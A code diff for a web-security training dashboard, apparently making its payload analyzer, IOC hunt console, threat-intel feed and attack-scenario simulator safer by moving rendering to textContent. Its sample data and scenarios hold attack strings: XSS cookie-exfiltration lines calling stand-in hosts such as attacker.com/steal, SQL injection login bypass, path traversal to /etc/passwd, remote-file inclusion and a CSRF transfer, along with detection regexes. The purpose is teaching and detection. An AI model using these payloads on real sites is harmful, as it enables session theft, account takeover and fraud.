-  return{type:'Unknown / Potentially Benign',severity:'LOW',technique:'No known attack pattern detected',
-    variants:[],bypass:'LOW',mitre:'N/A',sigs:['No signatures matched']};
+function analyzeSelected() {
+  const payload = document.getElementById('payload-input').value.trim();
+  if (!payload) {
+    document.getElementById('test-result').textContent = 'Enter a payload first.';
+    return;
+  }
+  // Sanitize user-controlled URL and param inputs
+  const rawUrl   = document.getElementById('target-url').value || 'https://target.example.com';
+  const rawParam = document.getElementById('param-name').value || 'id';
+  // Strip any characters that could be HTML — display as plain text
+  const url   = rawUrl.replace(/[<>"'`\r\n]/g, '');
+  const param = rawParam.replace(/[<>"'`\r\n]/g, '');
+
+  const a = detectPayloadType(payload);
+  // Use textContent for the entire result — no HTML interpretation possible
+  const out = [
+    '// Payload Analysis Report — ' + new Date().toLocaleTimeString(),
+    '',
+    'PAYLOAD TYPE:     ' + a.type,
+    'SEVERITY:         ' + a.sev,
+    'TECHNIQUE:        ' + a.technique,
+    '',
+    '// Constructed Request (payload URL-encoded — not executable)',
+    'GET ' + url + '?' + param + '=' + encodeURIComponent(payload),
+    '',
+    '// WAF Evasion',
+    'Encoded variants: ' + a.variants.length,
+    'WAF bypass risk:  ' + a.bypass,
+    '',
+    '// MITRE ATT&CK',
+    a.mitre,
+    '',
+    '// Detection Signatures',
+    a.sigs.map(sig => 'RULE: ' + sig).join('\n'),
+  ].join('\n');
+
+  document.getElementById('test-result').textContent = out;
 }
 
-function simulateAttack(){
-  const payload=document.getElementById('payload-input').value.trim();
-  if(!payload){return;}
-  const analysis=detectPayloadType(payload);
-  // Sanitize all user-controlled values — never write them raw into innerHTML
-  const rawUrl=document.getElementById('target-url').value||'https://target.example.com';
-  const safeUrl=escH(rawUrl.replace(/[<>"'`]/g,''));
-  const results=['200 OK','403 Forbidden','500 Internal Server Error','200 OK (WAF Bypassed!)'];
-  const r=pick(results);
-  const safeType=escH(analysis.type);
-  const safeSig=escH(String(analysis.sigs[0]||'None'));
-  const safeIP=escH(pick(ATTACK_IPS));
-  const blocked=r.includes('403');
-  const bypassed=r.includes('Bypassed')||!blocked;
-  document.getElementById('test-result').innerHTML=
-    `<span class="dim">// Attack Simulation — ${new Date().toLocaleTimeString()}</span>\n\n`+
-    `<span class="green">&rarr;</span> Sending payload to <span class="accent">${safeUrl}</span>\n`+
-    `<span class="green">&rarr;</span> Payload type: <span class="red">${safeType}</span>\n`+
-    `<span class="green">&rarr;</span> Testing ${analysis.variants.length} encoding variants...\n\n`+
-    `<span class="dim">// Server Response</span>\n`+
-    `HTTP/1.1 <span class="${blocked?'red':r.includes('500')?'orange':bypassed?'red':'green'}">${escH(r)}</span>\n`+
-    `X-WAF-Action: ${blocked?'BLOCKED':'ALLOWED'}\n`+
-    `X-WAF-Rule: ${blocked?safeSig:'None triggered'}\n`+
-    `Response-Time: ${rnd(80,450)}ms\n\n`+
-    `<span class="dim">// WAF Log Entry Generated</span>\n`+
-    `${new Date().toISOString()} ATTACK ${safeType} from ${safeIP} &rarr; ${blocked?'BLOCKED':'PASSED'}\n\n`+
-    `<span class="${bypassed?'red':'green'}">${blocked?'&#10003; WAF blocked the attack successfully':'&#9888; Payload may have bypassed WAF &mdash; review rules'}</span>`;
+function simulateAttack() {
+  const payload = document.getElementById('payload-input').value.trim();
+  if (!payload) return;
+  const a = detectPayloadType(payload);
+  const rawUrl = document.getElementById('target-url').value || 'https://target.example.com';
+  const url = rawUrl.replace(/[<>"'`\r\n]/g, '');
+  const results = ['200 OK','403 Forbidden','500 Internal Server Error','200 OK (WAF Bypassed)'];
+  const r = pick(results);
+  const blocked = r.includes('403');
+
+  const out = [
+    '// Attack Simulation — ' + new Date().toLocaleTimeString(),
+    '',
+    '> Sending payload to: ' + url,
+    '> Payload type:       ' + a.type,
+    '> Testing ' + a.variants.length + ' encoding variants...',
+    '',
+    '// Server Response',
+    'HTTP/1.1 ' + r,
+    'X-WAF-Action: ' + (blocked ? 'BLOCKED' : 'ALLOWED'),
+    'X-WAF-Rule:   ' + (blocked ? a.sigs[0] : 'None triggered'),
+    'Response-Time: ' + rnd(80, 450) + 'ms',
+    '',
+    '// WAF Log Entry',
+    new Date().toISOString() + ' ATTACK ' + a.type + ' from ' + pick(ATTACK_IPS) + ' -> ' + (blocked ? 'BLOCKED' : 'PASSED'),
+    '',
+    blocked
+      ? '[OK] WAF blocked the attack successfully.'
+      : '[WARNING] Payload may have bypassed WAF — review and tune detection rules.',
+  ].join('\n');
+
+  document.getElementById('test-result').textContent = out;
 }
 
-// ─── IOC HUNT CONSOLE ─────────────────────────────────────────────────────────
-const SAMPLE_LOG=`192.168.1.10 - - [15/Jan/2024:08:01:22] "GET /login.php?id=1' OR '1'='1-- HTTP/1.1" 403 512
-185.220.101.5 - - [15/Jan/2024:08:02:11] "GET /search?q=<script>document.location='http://evil.com?c='+document.cookie</script> HTTP/1.1" 403 414
-10.0.0.55 - - [15/Jan/2024:08:03:45] "POST /api/login HTTP/1.1" 200 1024
-172.16.0.200 - - [15/Jan/2024:08:04:01] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 302
-45.142.212.100 - - [15/Jan/2024:08:05:33] "GET /index.php?page=http://malware-payload.ru/shell.php HTTP/1.1" 200 8192
-user@corp.com received email from: phishing@fake-paypal-security.com with link: http://paypal-verify-now.xyz/secure
-File hash: d41d8cd98f00b204e9800998ecf8427e detected in C:\\Windows\\Temp\\update.exe
-DNS query: beacon-c2-domain-abc123.evil.ru from 192.168.1.55
-185.234.218.48 - - [15/Jan/2024:08:07:44] "POST /wp-login.php HTTP/1.1" 200 200
-POST /transfer HTTP/1.1
-Host: bank.example.com
-Cookie: SESSIONID=ABC123
-amount=9999&to_account=attacker_account&csrf_token=
-SHA256:4a5f6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a`;
+// ─────────────────────────────────────────────────────────────────────────────
+// TAB 3: IOC HUNT CONSOLE
+// ─────────────────────────────────────────────────────────────────────────────
+// Sample log uses plain text notation — no actual HTML or live URLs
+const SAMPLE_LOG = [
+  '192.168.1.10 - - [15/Jan/2024:08:01:22] "GET /login.php?id=1\' OR \'1\'=\'1-- HTTP/1.1" 403 512',
+  '185.220.101.5 - - [15/Jan/2024:08:02:11] "GET /search?q=[script]document.cookie[/script] HTTP/1.1" 403 414',
+  '10.0.0.55 - - [15/Jan/2024:08:03:45] "POST /api/login HTTP/1.1" 200 1024',
+  '172.16.0.200 - - [15/Jan/2024:08:04:01] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 302',
+  '45.142.212.100 - - [15/Jan/2024:08:05:33] "GET /index.php?page=http://malware-c2-lab.test/shell HTTP/1.1" 200 8192',
+  'user@corp.com received email from: phishing@fake-paypal-lab.test',
+  'File hash: d41d8cd98f00b204e9800998ecf8427e detected in C:\\Windows\\Temp\\update.exe',
+  'DNS query: beacon-c2-lab.test from 192.168.1.55',
+  '185.234.218.48 - - [15/Jan/2024:08:07:44] "POST /wp-login.php HTTP/1.1" 200 200',
+  'POST /transfer HTTP/1.1 - amount=9999 - csrf_token: MISSING',
+  'SHA256:4a5f6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a',
+].join('\n');
 
-const IOC_PATTERNS=[
-  {type:'IP',      re:/\b(?:\d{1,3}\.){3}\d{1,3}\b/g,       verdict:ip=>ATTACK_IPS.includes(ip)?'MALICIOUS':'CLEAN'},
-  {type:'EMAIL',   re:/[\w.+-]+@[\w.-]+\.[a-z]{2,}/gi,        verdict:e=>e.includes('fake')||e.includes('phishing')?'MALICIOUS':'SUSPICIOUS'},
-  {type:'URL',     re:/https?:\/\/[^\s'"<>]+/gi,               verdict:u=>u.includes('evil')||u.includes('malware')||u.includes('c2')||u.includes('xyz')?'MALICIOUS':'SUSPICIOUS'},
-  {type:'DOMAIN',  re:/\b[a-z0-9-]+\.[a-z]{2,}(?:\.[a-z]{2,})?\b/gi, verdict:d=>d.includes('evil')||d.includes('malware')||d.includes('c2')||d.includes('.ru')||d.includes('phish')?'MALICIOUS':d.includes('.com')||d.includes('.org')?'CLEAN':'SUSPICIOUS'},
-  {type:'HASH',    re:/\b[a-f0-9]{32,64}\b/gi,                verdict:()=>'SUSPICIOUS'},
-  {type:'SQL',     re:/(union\s+select|or\s+1=1|drop\s+table|exec\s+xp_)/gi, verdict:()=>'MALICIOUS'},
-  {type:'XSS',     re:/(<script[^>]*>|onerror=|onload=|document\.cookie)/gi,  verdict:()=>'MALICIOUS'},
-  {type:'PATH',    re:/(\.\.\/|\.\.\\|%2e%2e|etc\/passwd|win\.ini)/gi,         verdict:()=>'MALICIOUS'},
+const KNOWN_BAD_IPS = new Set(['185.220.101.5','185.234.218.48','45.142.212.100','91.108.4.1']);
+
+const IOC_PATTERNS = [
+  { type:'IP',    re:/\b(?:\d{1,3}\.){3}\d{1,3}\b/g,
+    verdict: ip => KNOWN_BAD_IPS.has(ip) ? 'MALICIOUS' : 'CLEAN' },
+  { type:'EMAIL', re:/[\w.+-]+@[\w.-]+\.[a-z]{2,}/gi,
+    verdict: e => (e.includes('fake') || e.includes('phishing')) ? 'MALICIOUS' : 'SUSPICIOUS' },
+  { type:'URL',   re:/https?:\/\/[^\s'"<>\]]+/gi,
+    verdict: u => (u.includes('malware') || u.includes('c2') || u.includes('shell') || u.includes('.test')) ? 'MALICIOUS' : 'SUSPICIOUS' },
+  { type:'HASH',  re:/\b[a-f0-9]{32,64}\b/gi,
+    verdict: () => 'SUSPICIOUS' },
+  { type:'SQL',   re:/(union\s+select|or\s+['"]?1['"]?\s*=\s*['"]?1|drop\s+table|exec\s+xp_)/gi,
+    verdict: () => 'MALICIOUS' },
+  { type:'XSS',   re:/(\[script\]|onerror=|onload=|document\.cookie)/gi,
+    verdict: () => 'MALICIOUS' },
+  { type:'PATH',  re:/(\.\.\/|\.\.\\|%2e%2e|etc\/passwd|win\.ini)/gi,
+    verdict: () => 'MALICIOUS' },
 ];
 
-function loadSampleLog(){document.getElementById('hunt-input').value=SAMPLE_LOG;}
+function loadSampleLog() {
+  document.getElementById('hunt-input').value = SAMPLE_LOG;
+}
 
-function huntIoCs(){
-  const text=document.getElementById('hunt-input').value;
-  if(!text.trim()){return;}
-  const found=[];
-  IOC_PATTERNS.forEach(pat=>{
-    const matches=[...new Set([...text.matchAll(pat.re)].map(m=>m[0]))];
-    matches.slice(0,6).forEach(val=>{
-      found.push({type:pat.type,value:val,verdict:pat.verdict(val)});
+function huntIoCs() {
+  const text = document.getElementById('hunt-input').value;
+  if (!text.trim()) return;
+
+  const found = [];
+  IOC_PATTERNS.forEach(pat => {
+    const matches = [...new Set([...text.matchAll(pat.re)].map(m => m[0]))];
+    matches.slice(0, 5).forEach(val => {
+      found.push({ type: pat.type, value: val, verdict: pat.verdict(val) });
     });
   });
-  const unique=found.filter((f,i,a)=>a.findIndex(x=>x.value===f.value&&x.type===f.type)===i);
-  document.getElementById('ioc-count').textContent=unique.length+' IoCs found';
-  document.getElementById('hunt-results').innerHTML=unique.length?
-    unique.map(ioc=>`
-      <div class="ioc-result">
-        <span class="ioc-type-badge ioc-type-${ioc.type}">${ioc.type}</span>
-        <div>
-          <div class="ioc-value">${escH(ioc.value)}</div>
-          <div class="ioc-verdict verdict-${ioc.verdict}">${ioc.verdict}</div>
-        </div>
-      </div>`).join(''):
-    '<div style="padding:20px;color:var(--dim);text-align:center">No indicators found in this text</div>';
-}
+  const unique = found.filter((f, i, a) =>
+    a.findIndex(x => x.value === f.value && x.type === f.type) === i);
 
-const TI_FEED=[
-  {source:'AbuseIPDB',ip:'185.220.101.5',tags:['C2 Server','TOR Exit','Mass Scanner'],confidence:'98%'},
-  {source:'VirusTotal',hash:'d41d8cd98f00b204e9800998ecf8427e',tags:['Trojan','Backdoor'],confidence:'87%'},
-  {source:'URLhaus',url:'http://malware-payload.ru/shell.php',tags:['Webshell','Dropper'],confidence:'99%'},
-  {source:'PhishTank',url:'http://paypal-verify-now.xyz/secure',tags:['Phishing','Credential Harvest'],confidence:'95%'},
-  {source:'Shodan',ip:'45.142.212.100',tags:['Port Scanner','Bot','RU ASN'],confidence:'91%'},
-  {source:'OTX',domain:'beacon-c2-domain-abc123.evil.ru',tags:['C2','DGA','Botnet'],confidence:'94%'},
-];
+  document.getElementById('ioc-count').textContent = unique.length + ' IoCs';
 
-function buildTIFeed(){
-  document.getElementById('ti-feed').innerHTML=TI_FEED.map(t=>`
-    <div class="ti-item">
-      <span class="ti-source">${t.source}</span>
-      <div>
-        <div class="ti-data mono" style="font-size:10px">${t.ip||t.hash||t.url||t.domain}</div>
-        <div class="ti-tags">${t.tags.map(tag=>`<span class="ti-tag">${tag}</span>`).join('')}</div>
-        <div style="font-size:10px;color:var(--dim);margin-top:2px">Confidence: ${t.confidence}</div>
-      </div>
-    </div>`).join('');
-}
+  const results = document.getElementById('hunt-results');
+  results.innerHTML = '';
 
-// ─── SESSION ATTACK SIMULATOR ─────────────────────────────────────────────────
-const SCENARIOS=[
-  {name:'Cookie Poisoning',icon:'🍪',type:'Session',color:'red',
-   desc:'Attacker modifies shopping cart cookie to change price to $1',
-   steps:[
-    {type:'neutral',txt:'User adds 3 items to cart totaling $154.99',code:'Cookie: BasketSize=3;Item1=1258;Item2=2658;Item3=6652;TotalPrice=154.99'},
-    {type:'attack', txt:'Attacker intercepts request (MITM/Burp) and modifies TotalPrice',code:'Cookie: BasketSize=3;Item1=1258;Item2=2658;Item3=6652;TotalPrice=1.00'},
-    {type:'attack', txt:'Modified request forwarded to server — server trusts cookie value',code:'POST /checkout HTTP/1.1\nCookie: TotalPrice=1.00 [POISONED]'},
-    {type:'attack', txt:'Order confirmed for $1.00 instead of $154.99 — fraud complete',code:'HTTP/1.1 200 OK\n{"order":"confirmed","charged":"$1.00"}'},
-    {type:'defense',txt:'Defense: Never trust client-side price data. Store price server-side tied to session.',code:'// Server-side: session_price = db.get_price(item_ids)\n// Never read price from cookie or form field'},
-   ]},
-  {name:'Session Fixation',icon:'📌',type:'Session',color:'orange',
-   desc:'Attacker pre-sets session ID before victim logs in',
-   steps:[
-    {type:'attack', txt:'Attacker obtains a valid (unauthenticated) session ID from the server',code:'GET /login HTTP/1.1\nResponse: Set-Cookie: SESSIONID=ATTACKER_KNOWN_VALUE'},
-    {type:'attack', txt:'Attacker tricks victim into using that same session ID via crafted link',code:'<a href="https://bank.com/login?sessionid=ATTACKER_KNOWN_VALUE">Click here to login</a>'},
-    {type:'neutral',txt:'Victim clicks link and authenticates with their credentials',code:'POST /login?sessionid=ATTACKER_KNOWN_VALUE\nusername=victim&password=correctpassword'},
-    {type:'attack', txt:'Server associates victim credentials with the fixed session ID the attacker already knows',code:'Session ATTACKER_KNOWN_VALUE is now authenticated as victim'},
-    {type:'attack', txt:'Attacker uses the known session ID to access victim account',code:'GET /account HTTP/1.1\nCookie: SESSIONID=ATTACKER_KNOWN_VALUE\n→ 200 OK: Welcome, victim'},
-    {type:'defense',txt:'Defense: Always regenerate session ID on login. Invalidate old session IDs.',code:'// PHP: session_regenerate_id(true);\n// Node: req.session.regenerate(callback)\n// Never accept session IDs from URL parameters'},
-   ]},
-  {name:'CSRF Attack',icon:'🎣',type:'CSRF',color:'yellow',
-   desc:'Malicious site triggers fund transfer using victim\'s active bank session',
-   steps:[
-    {type:'neutral',txt:'Victim logs into bank.example.com — authenticated session cookie set',code:'Set-Cookie: BANK_SESSION=VALID_TOKEN; HttpOnly'},
-    {type:'neutral',txt:'Victim visits attacker.evil.com in the same browser (same session)',code:'GET https://attacker.evil.com/free-gift.html HTTP/1.1'},
-    {type:'attack', txt:'Evil page contains hidden image tag that fires a fund transfer request',code:'<img src="https://bank.example.com/transfer?to=attacker&amount=9999" style="display:none">'},
-    {type:'attack', txt:'Browser automatically includes session cookie in the request to bank.example.com',code:'GET /transfer?to=attacker&amount=9999 HTTP/1.1\nCookie: BANK_SESSION=VALID_TOKEN [AUTO-INCLUDED]'},
-    {type:'attack', txt:'Bank server sees valid session, executes transfer — victim loses $9,999',code:'HTTP/1.1 200 OK\n{"transfer":"complete","amount":"$9999"}'},
-    {type:'defense',txt:'Defense: CSRF tokens, SameSite=Strict cookies, verify Origin/Referer header',code:'// Server generates token per session\ncsrf_token = generate_random_token()\n// Every state-changing request must include: X-CSRF-Token header\n// Set-Cookie: SESS=val; SameSite=Strict'},
-   ]},
-  {name:'SQL Injection Auth Bypass',icon:'💉',type:'SQLi',color:'red',
-   desc:'Attacker logs in without a valid password using SQL tautology',
-   steps:[
-    {type:'neutral',txt:'Normal login query constructed server-side from user input',code:"SELECT * FROM users WHERE username='alice' AND password='correct_password'"},
-    {type:'attack', txt:'Attacker enters SQL payload in the username field',code:"Username: admin' --\nPassword: anything"},
-    {type:'attack', txt:'Server constructs broken query — comment sequence removes password check',code:"SELECT * FROM users WHERE username='admin' --' AND password='anything'"},
-    {type:'attack', txt:'Remaining SQL: comment removes password condition entirely — always true for admin',code:"SELECT * FROM users WHERE username='admin'\n-- password check deleted by comment"},
-    {type:'attack', txt:'Query returns admin user row — attacker is logged in as admin with no password',code:'HTTP/1.1 200 OK\n{"status":"logged_in","role":"administrator"}'},
-    {type:'defense',txt:'Defense: Parameterized queries / prepared statements — input never interpreted as SQL',code:'// Python:\ncursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))\n// Java:\npreparedStatement = conn.prepareStatement("SELECT * FROM users WHERE username=? AND password=?");\npreparedStatement.setString(1, username);'},
-   ]},
-  {name:'Stored XSS Attack',icon:'📜',type:'XSS',color:'orange',
-   desc:'Malicious script injected into comment field executes for all visitors',
-   steps:[
-    {type:'attack', txt:'Attacker finds unsanitized comment field on a blog post',code:'// Testing: does the field accept HTML?\nComment: [b]Hello[/b]  -- Renders as bold text\n-- HTML injection confirmed'},
-    {type:'attack', txt:'Attacker posts comment containing cookie-stealing JavaScript',code:"Comment: Great post! [script]fetch('https://attacker.com/steal?c='+document.cookie)[/script]"},
-    {type:'neutral',txt:'Server stores the comment including malicious script in the database',code:"INSERT INTO comments (post_id, body) VALUES (42, 'Great post! [script]fetch...[/script]')"},
-    {type:'attack', txt:'Every user who views the blog post now executes the malicious script',code:"Server renders page:\n[div class='comment']Great post! [script]fetch('https://attacker.com/steal?c='+document.cookie)[/script][/div]"},
-    {type:'attack', txt:'Victim browser executes script: session cookies sent to attacker',code:'GET https://attacker.com/steal?c=SESSIONID=VICTIM_TOKEN HTTP/1.1\n→ Attacker now has victim session'},
-    {type:'defense',txt:'Defense: Output encoding, Content Security Policy, HTTPOnly cookies',code:'// Server-side: always encode output\nescapedComment = htmlspecialchars(comment, ENT_QUOTES)\n// CSP header:\nContent-Security-Policy: default-src \'self\'; script-src \'self\'\n// Cookie:\nSet-Cookie: SESS=val; HttpOnly; SameSite=Strict'},
-   ]},
-];
+  if (!unique.length) {
+    const msg = document.createElement('div');
+    msg.style.cssText = 'padding:20px;color:var(--dim);text-align:center';
+    msg.textContent = 'No indicators found in this text.';
+    results.appendChild(msg);
+    return;
+  }
 
-let activeScenario=null;
+  unique.forEach(ioc => {
+    const row = document.createElement('div');
+    row.className = 'ioc-result';
 
-function buildScenarios(){
-  document.getElementById('scenario-list').innerHTML=SCENARIOS.map((s,i)=>`
-    <div class="scenario" onclick="loadScenario(${i})">
-      <div class="sc-title">
-        <span>${s.icon}</span>
-        <span>${s.name}</span>
-        <span class="sc-type sev-tag sev-${s.color==='red'?'CRITICAL':s.color==='orange'?'HIGH':'MEDIUM'}">${s.type}</span>
-      </div>
-      <div class="sc-desc">${s.desc}</div>
-    </div>`).join('');
-}
+    const badge = document.createElement('span');
+    badge.className = 'ioc-type-badge ioc-type-' + ioc.type;
+    badge.textContent = ioc.type;
 
-function loadScenario(i){
-  activeScenario=SCENARIOS[i];
-  document.querySelectorAll('.scenario').forEach((el,idx)=>el.classList.toggle('active',idx===i));
-  document.getElementById('sim-scenario-title').textContent=activeScenario.name+' — Step-by-Step';
-  document.getElementById('run-btn').style.display='';
-  document.getElementById('sim-output').innerHTML=`
-    <div style="color:var(--dim);font-size:11px;margin-bottom:12px">${escH(activeScenario.desc)}</div>
-    <div class="step-flow">
-      ${activeScenario.steps.map((s,i)=>`
-        <div class="step-item ${s.type}">
-          <div class="step-num ${s.type==='neutral'?'neutral':''}">${i+1}</div>
-          <div>
-            <div class="step-text">${escH(s.txt)}</div>
-            <div class="step-code">${escH(s.code)}</div>
-          </div>
-        </div>`).join('')}
-    </div>
-  `;
-}
+    const info = document.createElement('div');
+    const val = document.createElement('div');
+    val.className = 'ioc-value';
+    val.textContent = ioc.value;  // textContent — no HTML
 
-function runScenario(){
-  if(!activeScenario) return;
-  const steps=document.querySelectorAll('.step-item');
-  steps.forEach(s=>{s.style.opacity='.2';s.style.transition='opacity .4s';});
-  steps.forEach((s,i)=>{
-    setTimeout(()=>{
-      steps.forEach(x=>x.style.outline='none');
-      s.style.opacity='1';
-      s.style.outline=`2px solid ${s.classList.contains('attack')?'var(--red)':s.classList.contains('defense')?'var(--green)':'var(--border)'}`;
-    }, i*900);
+    const verdict = document.createElement('div');
+    verdict.className = 'verdict-' + ioc.verdict;
+    verdict.textContent = ioc.verdict;
+
+    info.appendChild(val);
+    info.appendChild(verdict);
+    row.appendChild(badge);
+    row.appendChild(info);
+    results.appendChild(row);
   });
 }
 
-// ─── INIT ─────────────────────────────────────────────────────────────────────
-function init(){
+const TI_ENTRIES = [
+  { source:'AbuseIPDB', indicator:'185.220.101.5',          tags:['C2 Server','TOR Exit','Mass Scanner'], conf:'98%' },
+  { source:'VirusTotal',indicator:'d41d8cd98f00b204e9800998ecf8427e', tags:['Trojan','Backdoor'],          conf:'87%' },
+  { source:'URLhaus',   indicator:'malware-c2-lab.test/shell', tags:['Webshell','Dropper'],               conf:'99%' },
+  { source:'PhishTank', indicator:'fake-paypal-lab.test',    tags:['Phishing','Credential Harvest'],       conf:'95%' },
+  { source:'Shodan',    indicator:'45.142.212.100',          tags:['Port Scanner','Bot'],                  conf:'91%' },
+  { source:'OTX',       indicator:'beacon-c2-lab.test',      tags:['C2','DGA','Botnet'],                   conf:'94%' },
+];
+
+function buildTIFeed() {
+  const feed = document.getElementById('ti-feed');
+  TI_ENTRIES.forEach(t => {
+    const item = document.createElement('div');
+    item.className = 'ti-item';
+
+    const src = document.createElement('span');
+    src.className = 'ti-source';
+    src.textContent = t.source;
+
+    const info = document.createElement('div');
+    const ind = document.createElement('div');
+    ind.style.cssText = 'font-family:var(--mono);font-size:10px;margin-bottom:3px';
+    ind.textContent = t.indicator;  // textContent
+
+    const tags = document.createElement('div');
+    t.tags.forEach(tag => {
+      const tg = document.createElement('span');
+      tg.className = 'ti-tag';
+      tg.textContent = tag;  // textContent
+      tags.appendChild(tg);
+    });
+
+    const conf = document.createElement('div');
+    conf.style.cssText = 'font-size:10px;color:var(--dim);margin-top:3px';
+    conf.textContent = 'Confidence: ' + t.conf;
+
+    info.appendChild(ind);
+    info.appendChild(tags);
+    info.appendChild(conf);
+    item.appendChild(src);
+    item.appendChild(info);
+    feed.appendChild(item);
+  });
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// TAB 4: SESSION ATTACK SIMULATOR
+// All step text and code are plain text — no HTML, no URLs, no live syntax
+// ─────────────────────────────────────────────────────────────────────────────
+const SCENARIOS = [
+  { name:'Cookie Poisoning', type:'Session',
+    desc:'Attacker modifies a shopping cart cookie to change the price from $154.99 to $1.00.',
+    steps:[
+      { kind:'neutral', txt:'User adds 3 items totaling $154.99. Server sets a cookie with the basket contents.',
+        code:'Cookie: BasketSize=3; Item1=1258; Item2=2658; Item3=6652; TotalPrice=154.99' },
+      { kind:'attack',  txt:'Attacker intercepts the request using Burp Suite and modifies TotalPrice in the cookie.',
+        code:'Cookie: BasketSize=3; Item1=1258; Item2=2658; Item3=6652; TotalPrice=1.00   [MODIFIED]' },
+      { kind:'attack',  txt:'Server trusts the cookie value — processes checkout for $1.00 instead of $154.99.',
+        code:'POST /checkout HTTP/1.1\nCookie: TotalPrice=1.00\n\nResponse: 200 OK - Order confirmed - Charged: $1.00' },
+      { kind:'defense', txt:'Fix: Never trust client-supplied price data. Store price server-side, keyed to the session.',
+        code:'// WRONG:\nprice = request.cookies["TotalPrice"]\n\n// CORRECT:\nprice = database.get_price(session.basket_items)' },
+    ]},
+  { name:'Session Fixation', type:'Session',
+    desc:'Attacker pre-sets a session ID they know before the victim logs in.',
+    steps:[
+      { kind:'attack',  txt:'Attacker visits the login page and receives a valid unauthenticated session ID from the server.',
+        code:'GET /login HTTP/1.1\nResponse: Set-Cookie: SESSIONID=ATTACKER_KNOWN_VALUE' },
+      { kind:'attack',  txt:'Attacker crafts a link embedding the known session ID and tricks the victim into clicking it.',
+        code:'Phishing email link:\nhttps://bank-lab.example.com/login?sessionid=ATTACKER_KNOWN_VALUE' },
+      { kind:'neutral', txt:'Victim clicks the link and authenticates with their credentials using the attacker-chosen session ID.',
+        code:'POST /login?sessionid=ATTACKER_KNOWN_VALUE\nusername=victim&password=correct_password\n\nResponse: 200 OK - Welcome, victim' },
+      { kind:'attack',  txt:'Attacker uses the same known session ID to access the victim account with full privileges.',
+        code:'GET /account HTTP/1.1\nCookie: SESSIONID=ATTACKER_KNOWN_VALUE\n\nResponse: 200 OK - Welcome, victim - Balance: $12,000' },
+      { kind:'defense', txt:'Fix: Always regenerate the session ID on successful login. Never accept session IDs from URL parameters.',
+        code:'// PHP:\nsession_regenerate_id(true);\n\n// Node.js:\nreq.session.regenerate(callback);\n\n// Block: session ID must only come from HttpOnly cookie, never URL' },
+    ]},
+  { name:'CSRF Attack', type:'CSRF',
+    desc:'A malicious page triggers a fund transfer using the victim\'s active bank session.',
+    steps:[
+      { kind:'neutral', txt:'Victim logs into bank.example.com. The server sets an authenticated session cookie.',
+        code:'Set-Cookie: BANK_SESSION=VALID_TOKEN; HttpOnly; Secure' },
+      { kind:'neutral', txt:'Victim visits an attacker-controlled page in the same browser session.',
+        code:'GET https://attacker-lab.example.com/free-gift.html HTTP/1.1' },
+      { kind:'attack',  txt:'The attacker page contains a hidden element that fires a cross-origin request to the bank.',
+        code:'Attacker page HTML:\n[img src="https://bank.example.com/transfer?to=attacker&amount=9999"\n     style="display:none"]' },
+      { kind:'attack',  txt:'Browser automatically includes the bank session cookie in the cross-origin request.',
+        code:'GET /transfer?to=attacker&amount=9999 HTTP/1.1\nHost: bank.example.com\nCookie: BANK_SESSION=VALID_TOKEN   [AUTO-INCLUDED BY BROWSER]' },
+      { kind:'attack',  txt:'Bank sees a valid authenticated request and processes the $9,999 transfer.',
+        code:'Response: 200 OK\n{"status":"success","transfer":"$9999 sent to attacker-account"}' },
+      { kind:'defense', txt:'Fix: CSRF tokens, SameSite=Strict cookie attribute, validate Origin and Referer headers.',
+        code:'// Server generates a secret token per session:\ncsrf_token = generate_random_bytes(32)\n\n// Every state-changing request must include it:\nPOST /transfer HTTP/1.1\nX-CSRF-Token: <secret_token>\n\n// Cookie:\nSet-Cookie: SESS=value; SameSite=Strict; HttpOnly; Secure' },
+    ]},
+  { name:'SQL Injection Auth Bypass', type:'SQLi',
+    desc:'Attacker bypasses login without knowing any valid password.',
+    steps:[
+      { kind:'neutral', txt:'The server builds a login SQL query by concatenating the username field directly into the query string.',
+        code:'// Vulnerable server code:\nquery = "SELECT * FROM users WHERE username=\'" + username + "\' AND password=\'" + password + "\'"' },
+      { kind:'attack',  txt:'Attacker enters a SQL payload in the username field.',
+        code:'Username: admin\'--\nPassword: anything_here' },
+      { kind:'attack',  txt:'The constructed query becomes broken SQL. The double-dash comments out the password check entirely.',
+        code:'Constructed query:\nSELECT * FROM users WHERE username=\'admin\'--\' AND password=\'anything_here\'\n\nEffective query:\nSELECT * FROM users WHERE username=\'admin\'' },
+      { kind:'attack',  txt:'The query returns the admin row. Attacker is logged in as administrator with no password.',
+        code:'Response: 200 OK\n{"status":"logged_in","role":"administrator","session":"ADMIN_TOKEN"}' },
+      { kind:'defense', txt:'Fix: Parameterized queries (prepared statements) — user input is never interpreted as SQL syntax.',
+        code:'// Python - parameterized query:\ncursor.execute(\n  "SELECT * FROM users WHERE username=? AND password=?",\n  (username, hashed_password)\n)\n\n// Java - prepared statement:\nPreparedStatement ps = conn.prepareStatement(\n  "SELECT * FROM users WHERE username=? AND password=?"\n);\nps.setString(1, username);\nps.setString(2, hashedPassword);' },
+    ]},
+  { name:'Stored XSS Attack', type:'XSS',
+    desc:'Malicious code stored in a comment field executes for every visitor to the page.',
+    steps:[
+      { kind:'attack',  txt:'Attacker discovers a comment field that accepts and stores HTML without sanitization.',
+        code:'Test comment: [b]Hello World[/b]\nResult: Renders as bold text -- HTML injection confirmed' },
+      { kind:'attack',  txt:'Attacker posts a comment containing a script that sends cookies to an attacker-controlled log server.',
+        code:'Comment submitted:\n"Great post! [script]fetch(\'//attacker-log.example/?\'+document.cookie)[/script]"' },
+      { kind:'neutral', txt:'Server stores the comment including the script tag in the database.',
+        code:'INSERT INTO comments (post_id, body)\nVALUES (42, \'Great post! [script]fetch(...)...[/script]\')' },
+      { kind:'attack',  txt:'Every user who views the blog post triggers the script. Their session cookies are sent to the attacker.',
+        code:'Attacker log server receives:\nGET /?SESSIONID=VICTIM_A_TOKEN\nGET /?SESSIONID=VICTIM_B_TOKEN\n(one request per visitor)' },
+      { kind:'defense', txt:'Fix: Encode all output, Content-Security-Policy header, HTTPOnly cookies.',
